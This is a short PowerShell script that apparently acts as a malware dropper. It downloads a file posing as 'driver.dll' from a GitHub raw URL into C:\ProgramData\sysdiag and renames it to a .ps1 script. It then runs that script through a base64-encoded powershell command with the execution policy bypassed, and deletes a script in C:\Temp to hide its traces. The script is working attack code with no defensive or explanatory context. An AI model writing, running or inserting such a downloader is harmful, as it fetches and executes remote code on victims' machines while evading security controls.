# UID = 998711036365

Start-Sleep 3
$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/driver.dll"
$destPath = "C:\ProgramData\sysdiag\driver.dll"
$execPath = "C:\ProgramData\sysdiag\driver.ps1"

$folder = Split-Path $destPath
if (-not (Test-Path $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri $dropUrl -OutFile $destPath

Copy-Item -Path $destPath -Destination $execPath

$cmd = "powershell -ExecutionPolicy Bypass -File `"$execPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encodedCommand

Start-Sleep -Seconds 1
Remove-Item -Path "C:\Temp\service.ps1" -ErrorAction SilentlyContinue
